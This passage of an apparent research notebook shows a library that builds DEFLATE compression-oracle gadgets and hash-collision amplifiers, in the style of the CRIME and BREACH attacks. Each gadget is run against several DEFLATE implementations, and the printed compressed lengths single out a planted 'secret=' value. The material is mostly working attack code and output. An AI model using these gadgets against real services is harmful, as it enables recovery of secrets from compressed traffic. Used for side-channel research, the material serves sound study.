    print(type(automated_amplify_automaton.last_gadget().gadget_in_use).__name__)

[level=3] True [(0, 812), (1, 762), (2, 812), (3, 812), (4, 812), (5, 812), (6, 811), (7, 813), (8, 813), (9, 813)]
MatchChainFastAmplify
[level=4] True [(0, 764), (1, 723), (2, 765), (3, 765), (4, 765), (5, 765), (6, 764), (7, 764), (8, 765), (9, 765)]
MatchChainFastAmplify
[level=6] True [(0, 787), (1, 748), (2, 789), (3, 789), (4, 789), (5, 789), (6, 788), (7, 788), (8, 788), (9, 788)]
MatchChainLazyAmplify
[level=3] True [(0, 602), (1, 667), (2, 603), (3, 603), (4, 603), (5, 603), (6, 602), (7, 602), (8, 603), (9, 603)]
MatchChainFastAmplify
[level=4] True [(0, 586), (1, 635), (2, 587), (3, 587), (4, 587), (5, 587), (6, 586), (7, 586), (8, 586), (9, 586)]
MatchChainFastAmplify
[level=6] True [(0, 605), (1, 654), (2, 606), (3, 606), (4, 606), (5, 606), (6, 606), (7, 605), (8, 606), (9, 606)]
MatchChainLazyAmplify


### Logical gadgets

#### NOT gadgets

In [30]:
short_not_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHANUMERIC_BYTES,
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(ShortNOT())
    .add(ShortNOT(content=b"!!"))
    .add(ShortNOT(charset=utils.ASCII_PRINTABLE_BYTES))
)

query = short_not_automaton.compile()
pretty_print(query)

b'-1i6-6!!-!\t7-@@@@@@@@@@secret=1i6!!\t7'


In [31]:
long_fast_not_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHANUMERIC_BYTES,
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(LongFastNOT())
    .add(LongFastNOT(b"!ABCD"))
    .add(LongFastNOT(k=4, charset=utils.ASCII_PRINTABLE_BYTES))
)

query = long_fast_not_automaton.compile()
pretty_print(query)

b'-1KD-KD6c-6cV-V!A-!ABC-BCD-D(5_-(5_a?M-a?Mx-@@@@@@@@@@secret=1KD6cV!ABCD(5_a'
b'?Mx'


In [32]:
long_general_not_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHANUMERIC_BYTES,
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(LongGeneralNOT())
    .add(LongGeneralNOT(b"A!CDEF"))
    .add(LongGeneralNOT(k=3, charset=utils.ASCII_PRINTABLE_BYTES))
)

query = long_general_not_automaton.compile()
pretty_print(query)

b'-1Fm-mVs-VsL-LA!-!CDE-CDEF-Frd-d%Y-%YV-@@@@@@@@@@secret=1FmVsLA!CDEFrd%YV'


In [33]:
long_lazy_not_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHANUMERIC_BYTES,
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(LongLazyNOT())
    .add(LongLazyNOT(b"A!CDEF"))
    .add(LongLazyNOT(k=6, charset=utils.ASCII_PRINTABLE_BYTES))
)

query = long_lazy_not_automaton.compile()
pretty_print(query)

b'-1rBx-Bxgh-ghP-PA!C-!CDE-DEF-F]HM:3-HM:3/B2<-/B2<;-@@@@@@@@@@secret=1rBxghPA'
b'!CDEF]HM:3/B2<;'


In [34]:
not_automata = [
    short_not_automaton,
    long_fast_not_automaton,
    long_general_not_automaton,
    long_lazy_not_automaton,
]

for not_automaton in not_automata:
    gadget_name = type(not_automaton.last_gadget()).__name__
    print("-" * 20 + gadget_name + "-" * (30 - len(gadget_name)))
    not_automaton.add(DistanceChainAmplify(100, 4, double=True))

    print(
        "[level 3] sanity check:",
        not_automaton.set_params(params=params.ZLIB_PARAMS[3]).sanity_check(),
    )
    print_example_test_result(not_automaton.compile(), GZipCompressor(3).compress)

    print(
        "[level 6] sanity check:",
        not_automaton.set_params(params=params.ZLIB_PARAMS[6]).sanity_check(),
    )
    print_example_test_result(not_automaton.compile(), GZipCompressor(6).compress)

--------------------ShortNOT----------------------
[level 3] sanity check: True
[(0, 497), (1, 504), (2, 497), (3, 497), (4, 497), (5, 497), (6, 498), (7, 498), (8, 497), (9, 497)]
[level 6] sanity check: True
[(0, 497), (1, 504), (2, 497), (3, 497), (4, 497), (5, 497), (6, 497), (7, 497), (8, 497), (9, 497)]
--------------------LongFastNOT-------------------
[level 3] sanity check: True
[(0, 523), (1, 533), (2, 522), (3, 522), (4, 523), (5, 522), (6, 522), (7, 523), (8, 522), (9, 523)]
[level 6] sanity check: False
[(0, 534), (1, 533), (2, 533), (3, 534), (4, 534), (5, 533), (6, 533), (7, 534), (8, 533), (9, 534)]
--------------------LongGeneralNOT----------------
[level 3] sanity check: True
[(0, 517), (1, 527), (2, 518), (3, 518), (4, 518), (5, 518), (6, 517), (7, 518), (8, 517), (9, 518)]
[level 6] sanity check: True
[(0, 517), (1, 527), (2, 517), (3, 517), (4, 517), (5, 517), (6, 517), (7, 517), (8, 517), (9, 517)]
--------------------LongLazyNOT-------------------
[level 3] sanit

In [35]:
long_automated_not_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHANUMERIC_BYTES,
        params=params.ZLIB_PARAMS[6],
        filler=filler.SimpleFiller(b"-" * 10),
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(LongAutomatedNOT())
)
query = long_automated_not_automaton.compile()
pretty_print(query)

long_automated_not_automaton.add(DistanceChainAmplify(100, 4, double=True))

print(
    long_automated_not_automaton.set_params(params=params.ZLIB_PARAMS[3]).sanity_check()
)
print_example_test_result(
    long_automated_not_automaton.compile(force_recompile=True),
    GZipCompressor(3).compress,
)
print(type(long_automated_not_automaton.gadgets[-2].gadget_in_use).__name__)

print(
    long_automated_not_automaton.set_params(params=params.ZLIB_PARAMS[6]).sanity_check()
)
print_example_test_result(
    long_automated_not_automaton.compile(force_recompile=True),
    GZipCompressor(6).compress,
)
print(type(long_automated_not_automaton.gadgets[-2].gadget_in_use).__name__)

b'-----------1S9-9PM-PMQ-@@@@@@@@@@secret=1S9PMQ'
True
[(0, 503), (1, 508), (2, 502), (3, 502), (4, 502), (5, 503), (6, 502), (7, 503), (8, 502), (9, 503)]
LongFastNOT
True
[(0, 495), (1, 502), (2, 494), (3, 495), (4, 495), (5, 495), (6, 495), (7, 495), (8, 495), (9, 495)]
LongGeneralNOT


In [36]:
DefaultNOT is ShortNOT

True

#### AND-match gadget

In [37]:
and_match_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHANUMERIC_BYTES,
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(ANDTargetMatch(ByteMatch(b"secret=", b"?")))
    .add(
        ANDTargetMatch(
            TargetMatch(b"consectetur", add_prefix=True), nop_gadget=RandomNOP(5)
        )
    )
)

pretty_print(and_match_automaton.compile())
and_match_automaton.add(DistanceChainAmplify(100, 4, double=True))
print(and_match_automaton.sanity_check())

query = and_match_automaton.compile()
print_example_test_result(query, GZipCompressor(3).compress, data=LIPSUM + b"secret=?")
print_example_test_result(query, GZipCompressor(6).compress, data=LIPSUM + b"secret=?")

b'-1secret=-?4yfa-4yfam-mconsectetu-@@@@@@@@@@secret=1secret=?4yfamconsectetur'
True
[(0, 516), (1, 508), (2, 516), (3, 516), (4, 516), (5, 516), (6, 515), (7, 516), (8, 516), (9, 516)]
[(0, 515), (1, 506), (2, 515), (3, 515), (4, 515), (5, 515), (6, 514), (7, 515), (8, 515), (9, 515)]


#### OR-match gadgets

In [38]:
general_or_match_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHANUMERIC_BYTES,
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(GeneralORTargetMatch(ByteMatch(b"secret=", b"3")))
    .add(GeneralORTargetMatch(ByteMatch(b"secret=", b"5"), glue_content=b"OR"))
    .add(
        GeneralORTargetMatch(
            ByteMatch(b"secret=", b"7"), glue_charset=utils.ASCII_PRINTABLE_BYTES
        )
    )
    .add(GeneralORTargetMatch(ByteMatch(b"secret=", b"9"), glue_length=4, k=7))
)


pretty_print(general_or_match_automaton.compile())
general_or_match_automaton.add(DistanceChainAmplify(100, 4, double=True))

print(general_or_match_automaton.sanity_check())
print_example_test_result(
    general_or_match_automaton.compile(), GZipCompressor(6).compress
)

b'-siis-1sii-ecret=3-ORs-3OR-ecret=5-*8Qs-5*8Q-ecret=7-ZQyas-7ZQya-ecret=9-@@@'
b'@@@@@@@secret=1siisecret=3ORsecret=5*8Qsecret=7ZQyasecret=9'
True
[(0, 548), (1, 539), (2, 548), (3, 537), (4, 548), (5, 538), (6, 548), (7, 540), (8, 548), (9, 540)]


For `deflate_fast`, with the default dictionary choice, different entries may interact and cause unwanted effects.

The automated parameter selection of `k` can help alleviate this issue.
However, manual adjustment of the parameters and the dictionary may still be necessary in some cases,
requiring users' discretion. 

In [39]:
# this should not work; only `secret=9` is expected to have a shorter compressed length
print_example_test_result(
    general_or_match_automaton.compile(), GZipCompressor(3).compress
)

general_or_match_automaton.set_params(params=params.ZLIB_PARAMS[3])
amplify_gadget = general_or_match_automaton.pop(
    -1
)  # pop the last gadget temporarily for clarity
pretty_print(general_or_match_automaton.compile(force_recompile=True))
print(general_or_match_automaton.sanity_check())


# this should work now; note that a recompilation is necessary
print_example_test_result(
    general_or_match_automaton.add(amplify_gadget).compile(), GZipCompressor(3).compress
)

[(0, 549), (1, 549), (2, 549), (3, 549), (4, 548), (5, 550), (6, 548), (7, 550), (8, 549), (9, 541)]
b'-QuFse-1QuF-cret=3-ORse-3OR-cret=5-.\\$se-5.\\$-cret=7-eFJxs-7eFJx-ecret=9-@@@'
b'@@@@@@@secret=1QuFsecret=3ORsecret=5.\\$secret=7eFJxsecret=9'
True
[(0, 553), (1, 544), (2, 552), (3, 544), (4, 552), (5, 545), (6, 552), (7, 545), (8, 552), (9, 544)]


Other constructions for OR-match are also possible, as an analogy to `LongNOT` implies there exist at least three different constructions; here we only present one based on lazy matching.

In [40]:
lazy_or_match_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHANUMERIC_BYTES,
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(LazyORTargetMatch(ByteMatch(b"secret=", b"3")))
    .add(LazyORTargetMatch(ByteMatch(b"secret=", b"5"), glue_content=b"|OR"))
    .add(
        LazyORTargetMatch(
            ByteMatch(b"secret=", b"7"), glue_charset=utils.ASCII_PRINTABLE_BYTES
        )
    )
    .add(LazyORTargetMatch(ByteMatch(b"secret=", b"9"), glue_length=4, k=5))
)


pretty_print(lazy_or_match_automaton.compile())
lazy_or_match_automaton.add(DistanceChainAmplify(100, 4, double=True))

print(lazy_or_match_automaton.sanity_check())
print_example_test_result(lazy_or_match_automaton.compile(), GZipCompressor(6).compress)

print(lazy_or_match_automaton.set_params(params.ZLIB_PARAMS[3]).sanity_check())
print_example_test_result(lazy_or_match_automaton.compile(), GZipCompressor(3).compress)

b'-1V9n-9nsecre-t=3-3|OR-ORsecre-t=5-5b$<-$<secre-t=7-7clU2-lU2sec-ret=9-@@@@@'
b'@@@@@secret=1V9nsecret=3|ORsecret=5b$<secret=7clU2secret=9'
True
[(0, 552), (1, 545), (2, 552), (3, 545), (4, 552), (5, 544), (6, 552), (7, 544), (8, 552), (9, 543)]
False
[(0, 553), (1, 553), (2, 553), (3, 553), (4, 553), (5, 554), (6, 553), (7, 554), (8, 553), (9, 543)]


### More gadgetology

Build and test your own DEFLATE gadget using the class `GenericGadget`.

In [41]:
# modified from Gluck, Harris, and Prado: "BREACH: Reviving the CRIME attack", BlackHat 2013, page 7.
charset_pool = GenericGadget(
    b"secret=0{}{}-1-2-3-4-5-6-7-8-9", words_1=None, words_2=None
)

query = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_PARAMS[6],
    )
    .add(charset_pool)
    .compile()
)

pretty_print(query)
print_example_test_result(query, GZipCompressor(6).compress)

b'secret=0{}{}-1-2-3-4-5-6-7-8-9'
[(0, 340), (1, 343), (2, 342), (3, 342), (4, 342), (5, 342), (6, 342), (7, 342), (8, 343), (9, 343)]


## Other supported DEFLATE compressors

### zlib (in Python)

In [42]:
query = example_automaton.compile()
pretty_print(query)
print_example_test_result(query, ZlibMiniCompressor(6).compress)
print_example_test_result(
    query, lambda data: zlib.compress(data)
)  # may not be the original zlib in some operating systems (e.g. Fedora)

b'$-qnIn+qCUk-FCUk+Fxoh-yxoh+ylUr-ClUr+CvdB-gvdB+gOad-VOad+VbFT-DbFT+DzrN-bzrN'
b'+bIav-wIav+wCWe-qCWe+qpay-apay+aLNg-jLNg+jUYQ-oUYQ$<filler>0Dv5jDSZsd</fille'
b'r>$2sWAk*sWAkq*nInq*CUkF*xohy*lUrC*vdBg*OadV*bFTD*zrNb*Iavw*CWeq*paya*LNgj*U'
b'YQo$@@@@@@@@@@secret=2sWAkqnInqCUkFCUkFxohyxohylUrClUrCvdBgvdBgOadVOadVbFTDb'
b'FTDzrNbzrNbIavwIavwCWeqCWeqpayapayaLNgjLNgjUYQoUYQo'
[(0, 541), (1, 541), (2, 533), (3, 541), (4, 541), (5, 541), (6, 541), (7, 541), (8, 541), (9, 541)]
[(0, 549), (1, 549), (2, 542), (3, 549), (4, 549), (5, 548), (6, 549), (7, 549), (8, 549), (9, 549)]


### zlib-ng

In [43]:
from zlib_ng import zlib_ng

In [44]:
ng_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_NG_PARAMS[6],
        filler=filler.SimpleFiller(b"-" * 10),
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(MatchChainFastAmplify(60, 5))  # default is deflate-medium, which is quite weak
)

query = ng_automaton.compile()
print(len(query))
print_example_test_result(query, lambda x: zlib_ng.compress(x))

223
[(0, 452), (1, 443), (2, 454), (3, 453), (4, 453), (5, 454), (6, 453), (7, 452), (8, 452), (9, 452)]


### zlib-cloudflare

In [45]:
cf_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_CLOUDFLARE_PARAMS[6],
        filler=filler.SimpleFiller(b"-" * 10),
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(MatchChainLazyAmplify(60, 6))
)

query = cf_automaton.compile()
print(len(query))
print_example_test_result(query, ZlibCloudflareCompressor(6).compress)

220
[(0, 468), (1, 457), (2, 467), (3, 467), (4, 467), (5, 467), (6, 467), (7, 468), (8, 468), (9, 468)]


### zlib-chromium

In [46]:
cr_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.ZLIB_CHROMIUM_PARAMS[6],
        filler=filler.SimpleFiller(b"-" * 10),
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(MatchChainLazyAmplify(60, 6))
)

query = cr_automaton.compile()
print(len(query))
print_example_test_result(query, ZlibChromiumCompressor(6).compress)

220
[(0, 466), (1, 457), (2, 467), (3, 467), (4, 467), (5, 467), (6, 467), (7, 466), (8, 467), (9, 467)]


### Go/flate

In [47]:
go_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.GO_PARAMS[6],
        filler=filler.SimpleFiller(b"-" * 10),
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(MatchChainLazyAmplify(60, 6))
)

query = go_automaton.compile()
print(len(query))
print_example_test_result(query, GoFlateCompressor(6).compress)
print_example_test_result(query, GZipCompressor(6).compress)

220
[(0, 458), (1, 451), (2, 459), (3, 460), (4, 460), (5, 459), (6, 459), (7, 458), (8, 459), (9, 459)]
[(0, 463), (1, 453), (2, 464), (3, 464), (4, 464), (5, 464), (6, 464), (7, 463), (8, 464), (9, 464)]


### Rust/flate2 (miniz_oxide)

In [48]:
rust_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHABETIC_BYTES,
        params=params.MINIZ_PARAMS[6],
        filler=filler.SimpleFiller(b"-" * 10),
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(MatchChainLazyAmplify(60, 5))
)

query = rust_automaton.compile()
print(len(query))
print_example_test_result(query, RustFlate2Compressor(6).compress)
print_example_test_result(query, GZipCompressor(6).compress)

222
[(0, 452), (1, 444), (2, 453), (3, 453), (4, 453), (5, 453), (6, 453), (7, 452), (8, 453), (9, 453)]
[(0, 471), (1, 462), (2, 471), (3, 471), (4, 471), (5, 471), (6, 471), (7, 472), (8, 472), (9, 472)]


## Collisions and amplification

Collision-based amplification uses templates that rely on the so-called instance sets, which are sets of strings with some special properties.

The instance sets can either be hard-coded beforehand or constructed on the spot; in the latter case, it makes sense to at least hard-code some initial collisions, which can generally be found via a standard brute-force search.

### Collisions

It's generally sufficient to find some double-colliding strings, and for some hash functions one can find strongly double-colliding strings.

In [49]:
# it's also possible, but less efficient, to hard-code the hash value(s) at which the collsions can be found.

zlib_colls = params.ZLIB_DEFAULT_HASH.find_all_double_collisions_at(
    19027, charset=utils.ALPHANUMERIC_BYTES
)
print(
    zlib_colls,
    params.ZLIB_DEFAULT_HASH.check_strongly_double_colliding(zlib_colls, ord("Q")),
)

go_colls = params.ZLIB_GO_HASH.find_all_double_collisions_at(
    41168, charset=utils.ALPHANUMERIC_BYTES
)
print(go_colls, params.ZLIB_GO_HASH.check_strongly_double_colliding(go_colls, ord("C")))

[b'pPS3', b'pQs3', b'pS33', b'qpS3', b'qqs3', b'qs33', b's0S3', b's1s3', b's333', b'PPS3', b'PQs3', b'PS33', b'QpS3', b'Qqs3', b'Qs33', b'S0S3', b'S1s3', b'S333', b'0PS3', b'0Qs3', b'0S33', b'1pS3', b'1qs3', b'1s33', b'30S3', b'31s3', b'3333'] False
[b'w7jNC', b'CCCCC', b'PN20C', b'68TVC'] True


### Building instance sets

One can "inflate" the collisions to obtain a desired instance set.

In [50]:
go_initial_instance_set = DeflateInstanceSet(
    colls=[[b"w7jNC", b"PN20C", b"68TVC"]], hash_func=params.ZLIB_GO_HASH
)
go_initial_instance_set.is_consistent_deflate_fast_instance(), go_initial_instance_set.is_consistent_deflate_slow_instance()

(True, True)

The easiest way to do so is to expand the instance set by adding a fixed number of random bytes to each collision.

In [51]:
print(
    go_initial_instance_set.expand_by_fixed_size(
        charset=utils.ALPHANUMERIC_BYTES,
        target_k=2,
        num_bytes=1,
        val_func=DeflateInstanceSet.is_consistent_deflate_slow_instance,
    ).colls
)

[[b'w7jNCt', b'PN20Cg', b'68TVCR'], [b'w7jNC7', b'PN20CZ', b'68TVCx']]


A more complicated method can be used to expand the instance set such that its length either divides `max_match` or is a multiple of `max_match`.

In [52]:
go_max_match_instance = go_initial_instance_set.expand_to_max_match(
    charset=utils.ALPHANUMERIC_BYTES,
    target_k=13,
    min_expand=1,
    val_func=DeflateInstanceSet.is_consistent_deflate_slow_instance,
)
go_max_match_instance.total_length()

258

In [53]:
go_max_match_instance.colls

[[b'w7jNCC', b'PN20C6', b'68TVCg'],
 [b'w7jNCE', b'PN20Cj', b'68TVC7'],
 [b'w7jNCu', b'PN20Cm', b'68TVCs'],
 [b'w7jNCJ', b'PN20Cf', b'68TVC6'],
 [b'w7jNCH', b'PN20C1', b'68TVCT'],
 [b'w7jNC1y', b'PN20COZ', b'68TVC3F'],
 [b'w7jNC2w', b'PN20C9O', b'68TVCLN'],
 [b'w7jNCDe', b'PN20C7f', b'68TVCKu'],
 [b'w7jNCmJ', b'PN20C6s', b'68TVCPF'],
 [b'w7jNCFu', b'PN20CWm', b'68TVC0a'],
 [b'w7jNCyi', b'PN20CFU', b'68TVCIg'],
 [b'w7jNCDz', b'PN20Cad', b'68TVCoP'],
 [b'w7jNCsQ', b'PN20CE6', b'68TVCdR']]

### Instantiating templates

In [54]:
go_coll_amplify_automaton = (
    automata.DeflateAutomaton(
        charset=utils.ALPHANUMERIC_BYTES,
        params=params.GO_PARAMS[6],
        filler=filler.SimpleFiller(b"-" * 10),
    )
    .add(DefaultAlign(b"@", 10))
    .add(ByteMatch(b"secret=", b"1"))
    .add(
        CollisionAmplify(
            max_len=1000,
            instance=go_max_match_instance,
            nop_gadget=None,  # DefaultNOP(5)
        )
    )
)

query = go_coll_amplify_automaton.compile(force_recompile=True)
print(len(query))
print_example_test_result(query, GoFlateCompressor(6).compress)

1093
[(0, 540), (1, 650), (2, 540), (3, 540), (4, 538), (5, 539), (6, 540), (7, 540), (8, 539), (9, 539)]


The process above can be automated:

In [55]:
go_coll_amplify_automaton.replace(
    -1,
    CollisionAmplify(
        max_len=100000,
        instance=DeflateInstanceSet(
            colls=[[b"w7jNC", b"PN20C", b"68TVC"]], hash_func=params.ZLIB_GO_HASH
        ),
        auto_expand=True,
        nop_gadget=None,  # DefaultNOP(5),
    ),
)

for level in range(4, 9):  # level 9 is too slow
    print(
        go_coll_amplify_automaton.set_params(
            params=params.GO_PARAMS[level]
        ).sanity_check()
    )
    print_example_test_result(
        go_coll_amplify_automaton.compile(force_recompile=True),
        GoFlateCompressor(level).compress,
    )

True
[(0, 787), (1, 11822), (2, 787), (3, 787), (4, 787), (5, 787), (6, 787), (7, 787), (8, 787), (9, 787)]
True
[(0, 876), (1, 10250), (2, 878), (3, 878), (4, 878), (5, 878), (6, 878), (7, 876), (8, 878), (9, 877)]
True
[(0, 1112), (1, 15277), (2, 1112), (3, 1111), (4, 1112), (5, 1111), (6, 1111), (7, 1111), (8, 1112), (9, 1111)]
True
[(0, 1377), (1, 18090), (2, 1377), (3, 1377), (4, 1377), (5, 1377), (6, 1377), (7, 1377), (8, 1377), (9, 1376)]
True
[(0, 2894), (1, 19634), (2, 2894), (3, 2894), (4, 2894), (5, 2894), (6, 2894), (7, 2894), (8, 2894), (9, 2894)]


In [56]:
go_coll_amplify_automaton.replace(
    -1,
    CollisionAmplify(
        max_len=100000,
        instance=DeflateInstanceSet(
            colls=[[b"w7jN", b"PN20", b"68TV"]], hash_func=params.ZLIB_GO_HASH
        ),
        auto_expand=True,
        optimize_expand=0,
        add_colls_to_dict=False,
        nop_gadget=None,  # DefaultNOP(5),
    ),
)

for level in range(1, 5):
    print(
        go_coll_amplify_automaton.set_params(
            params=params.GO_PARAMS[level]
        ).sanity_check()
    )
    print_example_test_result(
        go_coll_amplify_automaton.compile(force_recompile=True),
        GoFlateCompressor(level).compress,
    )

True
[(0, 5929), (1, 10276), (2, 5926), (3, 5929), (4, 5929), (5, 5929), (6, 5926), (7, 5929), (8, 5926), (9, 5929)]
True
[(0, 888), (1, 11828), (2, 888), (3, 889), (4, 888), (5, 889), (6, 888), (7, 888), (8, 889), (9, 889)]
True
[(0, 968), (1, 14797), (2, 969), (3, 969), (4, 967), (5, 969), (6, 969), (7, 969), (8, 969), (9, 968)]
True
[(0, 788), (1, 16699), (2, 788), (3, 789), (4, 789), (5, 789), (6, 788), (7, 789), (8, 789), (9, 790)]


For level 9, skip validation to speed up exapnding the instance set:

In [57]:
go_coll_amplify_automaton.replace(
    -1,
    CollisionAmplify(
        max_len=100000,
        instance=DeflateInstanceSet(
            colls=[[b"w7jNC", b"PN20C", b"68TVC"]], hash_func=params.ZLIB_GO_HASH
        ),
        auto_expand=True,
        nop_gadget=None,  # DefaultNOP(5),
        min_expand=3,
        skip_validation=True,
    ),
)

print(go_coll_amplify_automaton.set_params(params=params.GO_PARAMS[9]).sanity_check())
print_example_test_result(
    go_coll_amplify_automaton.compile(force_recompile=True),
    GoFlateCompressor(9).compress,
)

True
[(0, 7987), (1, 26219), (2, 7987), (3, 7987), (4, 7987), (5, 7987), (6, 7987), (7, 7987), (8, 7987), (9, 7987)]


The templates are general and can be fine-tuned for better performance.